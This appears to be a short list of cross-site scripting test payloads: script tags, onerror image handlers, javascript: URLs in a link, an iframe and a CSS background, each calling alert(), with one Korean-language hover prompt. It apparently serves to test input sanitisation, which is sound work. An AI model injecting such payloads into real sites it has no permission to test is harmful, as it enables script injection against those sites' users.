<script>alert('XSS Test')</script>
<img src=x onerror="alert('XSS Test')">
<a href="javascript:alert('XSS Test')">Click me for XSS</a>
<iframe src="javascript:alert('XSS');"></iframe>
<div style="background:url(javascript:alert('XSS'))">이곳에 마우스를 올려보세요</div>
<img src="invalid-image" onerror="alert('XSS Test')">
